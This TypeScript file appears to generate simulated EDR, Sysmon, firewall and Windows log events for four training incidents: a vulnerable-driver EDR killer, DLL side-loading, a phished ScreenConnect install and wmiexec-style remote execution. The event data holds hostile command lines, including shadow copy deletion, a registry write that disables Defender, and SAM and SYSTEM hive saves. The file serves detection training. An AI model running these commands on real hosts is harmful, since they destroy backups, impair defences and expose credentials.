/**
 * Endpoint stories. Authored as CrowdStrike and Sysmon rows; instantiateStory relabels EDR rows to
 * the session's product, so all but the WMI one run on every built-in company.
 *
 *  1. core-byovd-edr-killer: a remote logon, two kernel drivers registered as services, Defender policy
 *     off, the sensor falling silent, shadow copies deleted (Akira, GuidePoint 2025).
 *  2. core-dll-sideload: a ZIP with a signed updater renamed as a document and a look-alike libcurl.dll.
 *  3. core-rmm-first-stage: a mail link to an executable that installs a remote support client.
 *  4. core-wmi-remote-exec: admin-share logon, WmiPrvSE children in the default wmiexec output pattern,
 *     hive save.
 */
import type { TelemetryEvent } from "@/lib/sim/types";
import { makeSha256 } from "@/lib/sim/iocs";
import { csAlert, csDns, csFile, csProcess, csRegistry } from "@/lib/sim/emitters/crowdstrike";
import { sysmonDriver, sysmonProcess } from "@/lib/sim/emitters/sysmon";
import { panConnection, panWeb } from "@/lib/sim/emitters/paloalto";
import { sentinelAlert } from "@/lib/sim/emitters/sentinel";
import { winDetailedShareAccess, winLogon, winServiceInstall } from "@/lib/sim/emitters/windowsSecurity";
import { mailClick, mailDelivered } from "@/lib/sim/scenario-packs/corroboratingTelemetry.events";
import { MAIL_GATEWAY_COMPANIES, AD_COMPANIES, OFFICE_EGRESS, clock, incident, lookalike, sysmonImageLoad, type CoreStoryDef } from "./_kit";

const cx = "nexacorp";
const CMD = "C:\\Windows\\System32\\cmd.exe";
const ms = "Microsoft Corporation";
const UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Safari/537.36 Edg/150.0.3520.46";

// ── 1. EDR killer with a vulnerable driver ───────────────────────────────────
function byovd(): TelemetryEvent[] {
  const T = clock("2026-10-12T22:30:00Z");
  const user = "m.reyes";
  const email = `${user}@nexacorp.com`;
  const host = "WS-ENG-2093";
  const ip = "10.10.20.93";
  const c = { companyId: cx, host, user: email, srcIp: ip };
  const tmp = `C:\\Users\\${user}\\AppData\\Local\\Temp`;
  const rw = `${tmp}\\rwdrv.sys`, rwHash = makeSha256("core-byovd-rwdrv");
  const hlp = `${tmp}\\hlpdrv.sys`, hlpHash = makeSha256("core-byovd-hlpdrv");
  const loader = `${tmp}\\svcupd.exe`, loaderHash = makeSha256("core-byovd-loader");
  const cmdHash = makeSha256("windows_cmd_exe_signed_microsoft");
  const regedit = "C:\\Windows\\regedit.exe", regHash = makeSha256("windows_regedit_exe_signed_microsoft");
  return incident("inc:core-byovd:1", [
    lookalike(sysmonDriver({
      companyId: cx, id: "cbv01", ts: T(0), host: "WS-ENG-2120", user: null, srcIp: "10.10.20.120", image: "C:\\Program Files\\RW-Everything\\RwDrv.sys", sha256: makeSha256("core-byovd-rweverything-install"),
      signed: true, signature: "RW-Everything", signatureStatus: "Valid", severity: "low",
      description: "Sysmon 6 on WS-ENG-2120: driver RwDrv.sys loaded from C:\\Program Files\\RW-Everything, signed, signature status Valid.",
    }), "Approved software: RW-Everything is on a software request for hardware diagnostics, installed under Program Files, and no service was created from a Temp folder."),
    winLogon({
      companyId: cx, id: "cbv01a", ts: T(2700), host, targetUser: user, logonType: 10, srcIp: "10.10.200.41", authPackage: "Negotiate", logSource: "windows_security", severity: "medium", mitre: "T1021.001", tactic: "Lateral Movement",
      description: "Security log 4624 on WS-ENG-2093: remote desktop logon for m.reyes from 10.10.200.41, an address in the VPN pool, at 23:15 UTC.",
    }),
    csProcess({
      ...c, id: "cbv01b", ts: T(2890), processName: "cmd.exe", pid: 5604, processPath: CMD, cmdline: "cmd.exe", parentName: "explorer.exe", parentPid: 5102, sha256: cmdHash, signed: true, signatureSubject: ms, integrity: "high", severity: "medium",
      mitre: "T1059.003", tactic: "Execution",
      description: "cmd.exe started from explorer.exe on WS-ENG-2093 for m.reyes at High integrity, in the remote desktop session.",
    }),
    csProcess({
      ...c, id: "cbv02", ts: T(3000), processName: "svcupd.exe", pid: 5820, processPath: loader, cmdline: `"${loader}"`, parentName: "cmd.exe", parentPid: 5604, sha256: loaderHash, signed: false, integrity: "high", severity: "medium",
      mitre: "T1036.005", tactic: "Stealth",
      description: "Unsigned svcupd.exe ran from m.reyes's Temp folder on WS-ENG-2093, started from cmd.exe.",
    }),
    csFile({
      ...c, id: "cbv03", ts: T(3006), path: rw, sha256: rwHash, size: 14_024, signed: true, severity: "medium", actorProcess: "svcupd.exe", actorPid: 5820, actorPath: loader, actorSha256: loaderHash,
      mitre: "T1068", tactic: "Privilege Escalation",
      description: "svcupd.exe (pid 5820) wrote rwdrv.sys to m.reyes's Temp folder.",
    }),
    winServiceInstall({
      companyId: cx, id: "cbv04", ts: T(3010), host, targetUser: "SYSTEM", userEmail: null, serviceName: "mgdsrv", imagePath: rw, serviceType: "kernel mode driver", startType: "demand start", logSource: "windows_security",
      severity: "high", mitre: "T1543.003", tactic: "Persistence",
      description: "System log 7045 on WS-ENG-2093: service mgdsrv installed, kernel mode driver, image rwdrv.sys in a user Temp folder.",
    }),
    sysmonDriver({
      companyId: cx, id: "cbv05", ts: T(3011), host, user: null, srcIp: ip, image: rw, sha256: rwHash, signed: true, signature: "RW-Everything", signatureStatus: "Valid", severity: "high", mitre: "T1068", tactic: "Privilege Escalation",
      description: "Sysmon 6 on WS-ENG-2093: driver rwdrv.sys loaded from m.reyes's Temp folder, signed, signature status Valid.",
    }),
    csFile({
      ...c, id: "cbv06", ts: T(3040), path: hlp, sha256: hlpHash, size: 28_672, signed: false, severity: "high", actorProcess: "svcupd.exe", actorPid: 5820, actorPath: loader, actorSha256: loaderHash,
      mitre: "T1068", tactic: "Privilege Escalation",
      description: "svcupd.exe (pid 5820) wrote hlpdrv.sys to m.reyes's Temp folder.",
    }),
    winServiceInstall({
      companyId: cx, id: "cbv07", ts: T(3044), host, targetUser: "SYSTEM", userEmail: null, serviceName: "KMHLPSVC", imagePath: hlp, serviceType: "kernel mode driver", startType: "demand start", logSource: "windows_security",
      severity: "high", mitre: "T1543.003", tactic: "Persistence",
      description: "System log 7045 on WS-ENG-2093: service KMHLPSVC installed, kernel mode driver, image hlpdrv.sys in a user Temp folder.",
    }),
    sysmonDriver({
      companyId: cx, id: "cbv08", ts: T(3045), host, user: null, srcIp: ip, image: hlp, sha256: hlpHash, signed: false, signature: "-", signatureStatus: "Unavailable", severity: "critical", mitre: "T1685", tactic: "Defense Impairment",
      description: "Sysmon 6 on WS-ENG-2093: driver hlpdrv.sys loaded from m.reyes's Temp folder, no valid signature.",
    }),
    { ...csAlert({
      ...c, id: "cbv09", ts: T(3050), threatName: "Vulnerable driver loaded, kernel access", detail: "A known-vulnerable signed driver was loaded by a service created from a user Temp folder.",
      mitre: "T1068", tactic: "Privilege Escalation", technique: "Exploitation for Privilege Escalation", severity: "critical", action: "detected",
      processName: "svcupd.exe", processPath: loader, cmdline: `"${loader}"`, sha256: loaderHash, pid: 5820, parentPath: CMD, processTree: "cmd.exe > svcupd.exe",
      description: "EDR alert on WS-ENG-2093: vulnerable driver loaded through service mgdsrv, process svcupd.exe (pid 5820).",
    }), edr_scope: "edr" as const },
    csProcess({
      ...c, id: "cbv10", ts: T(3070), processName: "regedit.exe", pid: 6010, processPath: regedit, cmdline: `regedit.exe /s ${tmp}\\wd.reg`, parentName: "svcupd.exe", parentPid: 5820, sha256: regHash, signed: true, signatureSubject: ms, integrity: "high",
      severity: "high", mitre: "T1685", tactic: "Defense Impairment",
      description: "regedit.exe imported wd.reg silently from m.reyes's Temp folder, started by svcupd.exe.",
    }),
    csRegistry({
      ...c, id: "cbv11", ts: T(3071), keyPath: "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender", valueName: "DisableAntiSpyware", valueData: "1", writerProcess: "regedit.exe", severity: "critical", mitre: "T1685", tactic: "Defense Impairment",
      description: "DisableAntiSpyware set to 1 under HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender by regedit.exe.",
    }),
    { ...sentinelAlert({
      companyId: cx, id: "cbv11a", ts: T(3130), user: email, host, srcIp: ip, alertName: "Endpoint sensor stopped reporting while the host stays online", severity: "critical", mitre: "T1685", tactic: "Defense Impairment",
      detail: "The endpoint protection sensor on this host sent no heartbeat for one minute, while its Windows logs kept arriving.",
      extendedProperties: { Host: host, SensorStatus: "offline", MissedHeartbeats: 4, WindowsEventsLastMinute: 37 },
      description: "Sentinel analytic: the endpoint sensor on WS-ENG-2093 stopped reporting one minute after the second driver loaded, while Windows logs from the host kept arriving.",
    }), edr_scope: "hybrid" as const },
    sysmonProcess({
      companyId: cx, id: "cbv12", ts: T(3200), host, user: email, srcIp: ip, processName: "cmd.exe", pid: 6188, processPath: CMD, cmdline: "cmd.exe /c vssadmin delete shadows /all /quiet", parentName: "svcupd.exe", parentPath: loader, parentPid: 5820, sha256: cmdHash, signed: true, integrity: "High",
      severity: "critical", mitre: "T1490", tactic: "Impact",
      description: "Sysmon 1 on WS-ENG-2093, after the sensor fell silent: cmd.exe ran vssadmin delete shadows /all /quiet, started by svcupd.exe.",
    }),
  ]);
}

// ── 2. DLL side-loading ──────────────────────────────────────────────────────
function dllSideload(): TelemetryEvent[] {
  const T = clock("2026-10-13T10:20:00Z");
  const email = "a.moreau@nexacorp.com";
  const user = "a.moreau";
  const host = "WS-MKT-3301";
  const ip = "10.10.20.33";
  const c = { companyId: cx, host, user: email, srcIp: ip };
  const dir = `C:\\Users\\${user}\\Downloads\\Statement_Q3`;
  const exe = `${dir}\\Statement_Q3.exe`, exeHash = makeSha256("core-sideload-signed-updater");
  const dll = `${dir}\\libcurl.dll`, dllHash = makeSha256("core-sideload-libcurl");
  const lure = "docs-statements-share.example";
  const c2 = "cdn-telemetry-sync.example";
  const dropIp = "203.0.113.206", c2Ip = "203.0.113.192";
  const persist = `C:\\Users\\${user}\\AppData\\Local\\UpdateSvc\\GUP.exe`;
  return incident("inc:core-sideload:1", [
    lookalike(sysmonImageLoad({
      companyId: cx, id: "csl01", ts: T(0), host: "WS-OPS-2214", user: "l.ferreira@nexacorp.com", srcIp: "10.10.20.14", image: "C:\\Program Files\\Notepad++\\updater\\GUP.exe", pid: 4208, parentName: "notepad++.exe",
      loaded: "C:\\Program Files\\Notepad++\\updater\\libcurl.dll", signed: true, signature: "Notepad++", signatureStatus: "Valid", severity: "low",
      description: "Sysmon 7 on WS-OPS-2214: GUP.exe loaded libcurl.dll from C:\\Program Files\\Notepad++\\updater, signed, signature status Valid.",
    }), "This is the updater in its own install folder loading its own signed library, started by Notepad++."),
    panWeb({
      ...c, id: "csl02", ts: T(600), url: `https://${lure}/s/Statement_Q3.zip`, domain: lure, category: "newly-registered-domain", action: "alert", dstIp: dropIp, status: 200, bytesIn: 4_318_204,
      file: { name: "Statement_Q3.zip", path: "/s/Statement_Q3.zip", sha256: makeSha256("core-sideload-zip"), size: 4_318_204 }, fileType: "zip", userAgent: UA, severity: "low", mitre: "T1204.002", tactic: "Execution",
      description: "Firewall URL log: WS-MKT-3301 downloaded Statement_Q3.zip from docs-statements-share.example, a newly registered domain.",
    }),
    csFile({
      ...c, id: "csl03", ts: T(640), path: dll, sha256: dllHash, size: 812_032, signed: false, severity: "low", actorProcess: "explorer.exe", actorPid: 3312, mitre: "T1574.001", tactic: "Stealth",
      description: "explorer.exe (pid 3312) extracted libcurl.dll to the Statement_Q3 folder in a.moreau's Downloads, next to Statement_Q3.exe.",
    }),
    csProcess({
      ...c, id: "csl04", ts: T(660), processName: "Statement_Q3.exe", pid: 7116, processPath: exe, cmdline: `"${exe}"`, parentName: "explorer.exe", parentPid: 3312, sha256: exeHash, signed: true, signatureSubject: "Notepad++", originalFileName: "GUP.exe",
      severity: "medium", mitre: "T1204.002", tactic: "Execution",
      description: "Statement_Q3.exe started from explorer.exe in a.moreau's Downloads. The file is signed and its embedded original name is GUP.exe.",
    }),
    sysmonProcess({
      companyId: cx, id: "csl04s", ts: T(660), host, user: email, srcIp: ip, processName: "Statement_Q3.exe", pid: 7116, processPath: exe, cmdline: `"${exe}"`, parentName: "explorer.exe", parentPid: 3312, sha256: exeHash, signed: true, originalFileName: "GUP.exe", integrity: "Medium",
      severity: "medium", mitre: "T1036.005", tactic: "Stealth",
      description: "Sysmon 1 on WS-MKT-3301: Statement_Q3.exe from a.moreau's Downloads, OriginalFileName GUP.exe.",
    }),
    sysmonImageLoad({
      companyId: cx, id: "csl05", ts: T(661), host, user: email, srcIp: ip, image: exe, pid: 7116, parentName: "explorer.exe", loaded: dll, sha256: dllHash, signed: false, signatureStatus: "Unavailable", severity: "high", mitre: "T1574.001", tactic: "Stealth",
      description: "Sysmon 7 on WS-MKT-3301: Statement_Q3.exe loaded libcurl.dll from its own Downloads folder, not signed.",
    }),
    { ...csAlert({
      ...c, id: "csl06", ts: T(670), threatName: "Signed binary loaded an unsigned library from a user folder", detail: "A signed process running from Downloads loaded an unsigned module of the same folder.",
      mitre: "T1574.001", tactic: "Stealth", technique: "Hijack Execution Flow: DLL", severity: "high", action: "detected", processName: "Statement_Q3.exe", processPath: exe, cmdline: `"${exe}"`, sha256: exeHash, pid: 7116,
      parentPath: "C:\\Windows\\explorer.exe", processTree: "explorer.exe > Statement_Q3.exe",
      description: "EDR alert on WS-MKT-3301: Statement_Q3.exe (pid 7116) loaded an unsigned library from Downloads.",
    }), edr_scope: "edr" as const },
    csDns({
      ...c, id: "csl07", ts: T(675), domain: c2, resolvedIp: c2Ip, processName: "Statement_Q3.exe", processPath: exe, pid: 7116, parentName: "explorer.exe", parentPid: 3312, sha256: exeHash, severity: "medium", mitre: "T1071.001", tactic: "Command and Control",
      description: "Statement_Q3.exe (pid 7116) resolved cdn-telemetry-sync.example.",
    }),
    panConnection({
      ...c, id: "csl08", ts: T(676), domain: c2, dstIp: c2Ip, remotePort: 443, app: "ssl", action: "allow", category: "unknown", bytesOut: 3_412, bytesIn: 18_906, severity: "medium", mitre: "T1071.001", tactic: "Command and Control",
      description: "Firewall: WS-MKT-3301 opened a TLS session to 203.0.113.192 (cdn-telemetry-sync.example).",
    }),
    csFile({
      ...c, id: "csl09", ts: T(720), path: persist, sha256: exeHash, size: 798_720, signed: true, severity: "medium", actorProcess: "Statement_Q3.exe", actorPid: 7116, actorPath: exe, actorSha256: exeHash, mitre: "T1036.005", tactic: "Stealth",
      description: "Statement_Q3.exe (pid 7116) copied itself to AppData\\Local\\UpdateSvc as GUP.exe.",
    }),
    csFile({
      ...c, id: "csl09b", ts: T(721), path: `C:\\Users\\${user}\\AppData\\Local\\UpdateSvc\\libcurl.dll`, sha256: dllHash, size: 812_032, signed: false, severity: "medium", actorProcess: "Statement_Q3.exe", actorPid: 7116, actorPath: exe, actorSha256: exeHash, mitre: "T1574.001", tactic: "Stealth",
      description: "Statement_Q3.exe (pid 7116) wrote libcurl.dll to AppData\\Local\\UpdateSvc next to GUP.exe, the same hash as the library in Downloads.",
    }),
    csRegistry({
      ...c, id: "csl10", ts: T(722), keyPath: "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run", valueName: "UpdateSvc", valueData: persist, writerProcess: "Statement_Q3.exe", severity: "high", mitre: "T1547.001", tactic: "Persistence",
      description: "Run value UpdateSvc written for a.moreau, pointing at GUP.exe in AppData\\Local\\UpdateSvc.",
    }),
  ]);
}

// ── 3. RMM as the first-stage payload ────────────────────────────────────────
function rmmFirstStage(): TelemetryEvent[] {
  const T = clock("2026-10-14T08:05:00Z");
  const email = "k.jansen@nexacorp.com";
  const user = "k.jansen";
  const host = "WS-HR-1182";
  const ip = "10.10.20.82";
  const c = { companyId: cx, host, user: email, srcIp: ip };
  const INC = "inc:core-rmm:1";
  const lure = "benefit-statement-view.example";
  const url = `https://${lure}/d/AnnualStatement.exe`;
  const dropIp = "203.0.113.208", relayIp = "203.0.113.193", relay = "instance-82kd-relay.fastsupport-desk.example";
  const dl = `C:\\Users\\${user}\\Downloads\\AnnualStatement.exe`, dlHash = makeSha256("core-rmm-installer");
  const scId = "9ab20c41de771f36";
  const svc = `C:\\Program Files (x86)\\ScreenConnect Client (${scId})\\ScreenConnect.ClientService.exe`, svcHash = makeSha256("remote-support-client-signed");
  const scArgs = (h: string, session: string) => `"?e=Access&y=Guest&h=${h}&p=8041&s=${session}"`;
  const attackArgs = scArgs(relay, "e52b18c0-7f3a-46d9-b1c4-90a7d3f6e218");
  const msi = "C:\\Windows\\System32\\msiexec.exe", msiHash = makeSha256("windows_msiexec_exe_signed_microsoft");
  const itSvc = "C:\\Program Files (x86)\\ScreenConnect Client (1c07e2a95b3d6a84)\\ScreenConnect.ClientService.exe";
  return incident(INC, [
    lookalike(csProcess({
      companyId: cx, id: "crm01", ts: T(0), host: "WS-ENG-2120", user: "p.albright@nexacorp.com", srcIp: "10.10.20.120", processName: "ScreenConnect.ClientService.exe", pid: 2204, processPath: itSvc,
      cmdline: `"${itSvc}" ${scArgs("support.nexacorp.com", "2c9f47d1-05be-4a63-8e17-c4b6a01d7f35")}`, parentName: "services.exe", parentPid: 740, sha256: makeSha256("corporate-remote-support-client-build"), signed: true, signatureSubject: "ConnectWise, LLC",
      runAsUser: "NT AUTHORITY\\SYSTEM", integrity: "system", severity: "low",
      description: "ScreenConnect.ClientService.exe started from services.exe on WS-ENG-2120 as SYSTEM, relay host support.nexacorp.com.",
    }), "The company's own remote support tool: the relay is the corporate support host and the client is deployed by IT."),
    mailDelivered({
      id: "crm02", ts: T(1200), incidentId: INC, user: email, sender: "notices@benefit-statement-view.example", headerFrom: "\"Pension Services\" <notices@benefit-statement-view.example>",
      subject: "Your annual pension statement is ready to view", messageId: "<71bd04e2a6f1@benefit-statement-view.example>", senderIp: "198.51.100.207", qid: "5Ee02B7A18",
      url, urlRewritten: `https://urldefense.proofpoint.com/v2/url?u=https-3A__${lure}_d_AnnualStatement.exe`, domain: lure, spf: "pass", dkim: "pass", dmarc: "none", phishScore: 28, spamScore: 14, severity: "low", mitre: "T1566.002", tactic: "Initial Access",
      description: "A pension statement notice was delivered to k.jansen from notices@benefit-statement-view.example, with a link to an .exe file on the same domain.",
    }),
    { ...mailClick({
      id: "crm03", ts: T(2640), incidentId: INC, user: email, sender: "notices@benefit-statement-view.example", messageId: "<71bd04e2a6f1@benefit-statement-view.example>", qid: "5Ee02B7A18", url, domain: lure, clickIp: OFFICE_EGRESS, userAgent: UA,
      description: "k.jansen followed the link in the pension statement notice from the office egress.",
    }), mitre_technique: "T1204.001", mitre_tactic: "Execution" },
    panWeb({
      ...c, id: "crm04", ts: T(2643), url, domain: lure, category: "newly-registered-domain", action: "alert", dstIp: dropIp, status: 200, bytesIn: 5_871_104, file: { name: "AnnualStatement.exe", path: "/d/AnnualStatement.exe", sha256: dlHash, size: 5_871_104 }, fileType: "pe", userAgent: UA,
      severity: "medium", mitre: "T1105", tactic: "Command and Control",
      description: "Firewall URL log: WS-HR-1182 downloaded AnnualStatement.exe from benefit-statement-view.example, a newly registered domain.",
    }),
    csProcess({
      ...c, id: "crm05", ts: T(2680), processName: "AnnualStatement.exe", pid: 6340, processPath: dl, cmdline: `"${dl}"`, parentName: "explorer.exe", parentPid: 3120, sha256: dlHash, signed: true, signatureSubject: "ConnectWise, LLC", severity: "medium", mitre: "T1204.002", tactic: "Execution",
      description: "AnnualStatement.exe started from k.jansen's Downloads under explorer.exe. The file is signed by ConnectWise, LLC.",
    }),
    csProcess({
      ...c, id: "crm06", ts: T(2684), processName: "msiexec.exe", pid: 6412, processPath: msi, cmdline: `msiexec.exe /i "C:\\Users\\${user}\\AppData\\Local\\Temp\\ScreenConnect.ClientSetup.msi" /qn`, parentName: "AnnualStatement.exe", parentPid: 6340, sha256: msiHash, signed: true, signatureSubject: ms,
      severity: "medium", mitre: "T1218.007", tactic: "Stealth",
      description: "msiexec.exe installed ScreenConnect.ClientSetup.msi silently, started by AnnualStatement.exe.",
    }),
    winServiceInstall({
      companyId: cx, id: "crm07", ts: T(2700), host, targetUser: "SYSTEM", userEmail: null, serviceName: `ScreenConnect Client (${scId})`, imagePath: `"${svc}" ${attackArgs}`, logSource: "windows_security", severity: "high", mitre: "T1543.003", tactic: "Persistence",
      description: `System log 7045 on WS-HR-1182: service ScreenConnect Client (${scId}) installed, auto start, relay host instance-82kd-relay.fastsupport-desk.example.`,
    }),
    csProcess({
      ...c, id: "crm08", ts: T(2702), processName: "ScreenConnect.ClientService.exe", pid: 6520, processPath: svc, cmdline: `"${svc}" ${attackArgs}`, parentName: "services.exe", parentPid: 740, sha256: svcHash, signed: true, signatureSubject: "ConnectWise, LLC",
      runAsUser: "NT AUTHORITY\\SYSTEM", integrity: "system", severity: "high", mitre: "T1219.002", tactic: "Command and Control",
      description: "ScreenConnect.ClientService.exe started from services.exe on WS-HR-1182 as SYSTEM, relay host instance-82kd-relay.fastsupport-desk.example.",
    }),
    { ...csAlert({
      ...c, id: "crm09", ts: T(2710), threatName: "Remote access tool installed", detail: "A remote support client was installed and connected to its relay.",
      mitre: "T1219.002", tactic: "Command and Control", technique: "Remote Access Tools: Remote Desktop Software", severity: "high", action: "detected", processName: "ScreenConnect.ClientService.exe", processPath: svc, sha256: svcHash, pid: 6520,
      parentPath: "C:\\Windows\\System32\\services.exe", processTree: "services.exe > ScreenConnect.ClientService.exe",
      description: "EDR alert on WS-HR-1182: ScreenConnect.ClientService.exe (pid 6520) with relay host instance-82kd-relay.fastsupport-desk.example.",
    }), edr_scope: "edr" as const },
    panConnection({
      ...c, id: "crm10", ts: T(2712), domain: relay, dstIp: relayIp, remotePort: 8041, app: "ssl", action: "allow", category: "unknown", bytesOut: 61_022, bytesIn: 240_118, severity: "high", mitre: "T1219.002", tactic: "Command and Control",
      description: "Firewall: WS-HR-1182 opened a session to 203.0.113.193:8041 (instance-82kd-relay.fastsupport-desk.example).",
    }),
  ]);
}

// ── 4. WMI remote execution ──────────────────────────────────────────────────
function wmiRemoteExec(): TelemetryEvent[] {
  const T = clock("2026-10-15T23:10:00Z");
  const user = "svc.deploy";
  const email = `${user}@nexacorp.com`;
  const target = "SRV-NXC-FS01";
  const src = "WS-ENG-2093", srcIp = "10.10.20.93", tgtIp = "10.10.20.60";
  const c = { companyId: cx, host: target, user: email, srcIp: tgtIp };
  const wmi = "C:\\Windows\\System32\\wbem\\WmiPrvSE.exe";
  const cmdHash = makeSha256("windows_cmd_exe_signed_microsoft");
  // wmiexec names its output file after the clock of the machine running it.
  const out = `__${Math.floor(Date.parse(T(1810)) / 1000)}.4471`;
  const operator = "j.chen";
  const py = `C:\\Users\\${operator}\\AppData\\Local\\Temp\\py\\python.exe`;
  const wmic = (id: string, sec: number, pid: number, inner: string, mitre: string, tactic: string, description: string, severity: TelemetryEvent["severity"] = "high"): TelemetryEvent => csProcess({
    ...c, id, ts: T(sec), processName: "cmd.exe", pid, processPath: CMD, cmdline: `cmd.exe /Q /c ${inner} 1> \\\\127.0.0.1\\ADMIN$\\${out} 2>&1`, parentName: "WmiPrvSE.exe", parentPid: 2912, sha256: cmdHash, signed: true, signatureSubject: ms, severity, mitre, tactic, description,
  });
  return incident("inc:core-wmi:1", [
    lookalike(csProcess({
      ...c, id: "cwm01", ts: T(0), user: "svc.sccm@nexacorp.com", processName: "powershell.exe", pid: 3320, processPath: "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
      cmdline: "powershell.exe -NoLogo -NonInteractive -File C:\\Windows\\CCM\\SystemTemp\\inventory.ps1", parentName: "WmiPrvSE.exe", parentPid: 2912, sha256: makeSha256("windows_powershell_v1_signed_microsoft"), signed: true, signatureSubject: ms, severity: "low",
      description: "powershell.exe started by WmiPrvSE.exe on SRV-NXC-FS01, running inventory.ps1 from C:\\Windows\\CCM\\SystemTemp.",
    }), "Configuration Manager's nightly hardware inventory. The script sits in the CCM folder, no output is written to ADMIN$."),
    csProcess({
      companyId: cx, id: "cwm01a", ts: T(1795), host: src, user: `${operator}@nexacorp.com`, srcIp, processName: "python.exe", pid: 7704, processPath: py, cmdline: `"${py}" wx.py NEXACORP/${user}@${tgtIp}`,
      parentName: "cmd.exe", parentPid: 7610, sha256: makeSha256("core-wmi-python-runtime"), signed: false, severity: "medium", mitre: "T1047", tactic: "Execution",
      description: "python.exe from j.chen's Temp folder ran wx.py on WS-ENG-2093 with the account svc.deploy and the address of SRV-NXC-FS01 as arguments.",
    }),
    winLogon({
      companyId: cx, id: "cwm02", ts: T(1800), host: target, targetUser: user, logonType: 3, srcIp, authPackage: "NTLM", workstation: src, lmPackage: "NTLM V2", keyLength: "128", logSource: "windows_security", severity: "medium", mitre: "T1078.002", tactic: "Stealth",
      description: "Security log 4624 on SRV-NXC-FS01: network logon for svc.deploy from WS-ENG-2093 (10.10.20.93) using NTLM.",
    }),
    { ...wmic("cwm03", 1812, 4510, "whoami /all", "T1047", "Execution", "cmd.exe started by WmiPrvSE.exe on SRV-NXC-FS01 with /Q /c, running whoami and redirecting output to a file on ADMIN$."), is_detection: true, edr_scope: "hybrid" as const },
    winDetailedShareAccess({
      companyId: cx, id: "cwm04", ts: T(1815), host: target, targetUser: user, srcIp, shareName: "\\\\*\\ADMIN$", shareLocalPath: "\\??\\C:\\Windows", relativeTargetName: out, accessMask: "0x1", accessList: "%%4416", logSource: "windows_security", severity: "high", mitre: "T1021.002", tactic: "Lateral Movement",
      description: `Security log 5145 on SRV-NXC-FS01: svc.deploy read ${out} on ADMIN$ from 10.10.20.93.`,
    }),
    wmic("cwm05", 1840, 4602, "net group \"Domain Admins\" /domain", "T1069.002", "Discovery", "cmd.exe started by WmiPrvSE.exe on SRV-NXC-FS01 listed the Domain Admins group."),
    wmic("cwm06", 1900, 4688, "reg save HKLM\\SAM C:\\Windows\\Temp\\s.tmp", "T1003.002", "Credential Access", "cmd.exe started by WmiPrvSE.exe on SRV-NXC-FS01 saved the SAM hive to C:\\Windows\\Temp\\s.tmp.", "critical"),
    wmic("cwm07", 1905, 4706, "reg save HKLM\\SYSTEM C:\\Windows\\Temp\\y.tmp", "T1003.002", "Credential Access", "cmd.exe started by WmiPrvSE.exe on SRV-NXC-FS01 saved the SYSTEM hive to C:\\Windows\\Temp\\y.tmp.", "critical"),
    winDetailedShareAccess({
      companyId: cx, id: "cwm08", ts: T(1960), host: target, targetUser: user, srcIp, shareName: "\\\\*\\ADMIN$", shareLocalPath: "\\??\\C:\\Windows", relativeTargetName: "Temp\\s.tmp", accessMask: "0x1", accessList: "%%4416", logSource: "windows_security", severity: "high", mitre: "T1039", tactic: "Collection",
      description: "Security log 5145 on SRV-NXC-FS01: svc.deploy read Temp\\s.tmp on ADMIN$ from 10.10.20.93.",
    }),
    winDetailedShareAccess({
      companyId: cx, id: "cwm09", ts: T(1966), host: target, targetUser: user, srcIp, shareName: "\\\\*\\ADMIN$", shareLocalPath: "\\??\\C:\\Windows", relativeTargetName: "Temp\\y.tmp", accessMask: "0x1", accessList: "%%4416", logSource: "windows_security", severity: "high", mitre: "T1039", tactic: "Collection",
      description: "Security log 5145 on SRV-NXC-FS01: svc.deploy read Temp\\y.tmp on ADMIN$ from 10.10.20.93.",
    }),
  ]);
}

export const ENDPOINT_STORIES: CoreStoryDef[] = [
  { id: "core-byovd-edr-killer", title: "EDR Killer: Vulnerable Driver, Defender Policy Off, Shadow Copies Deleted", complexity: "advanced", events: byovd() },
  { id: "core-dll-sideload", title: "DLL Side-Loading: Signed Updater Renamed as a Statement", complexity: "foundation", events: dllSideload() },
  { id: "core-rmm-first-stage", title: "Remote Support Client as First Payload: Pension Statement Lure", complexity: "foundation", companies: MAIL_GATEWAY_COMPANIES, events: rmmFirstStage() },
  { id: "core-wmi-remote-exec", title: "WMI Remote Execution: wmiexec Pattern on a File Server, Hive Save", complexity: "advanced", companies: AD_COMPANIES, events: wmiRemoteExec() },
];
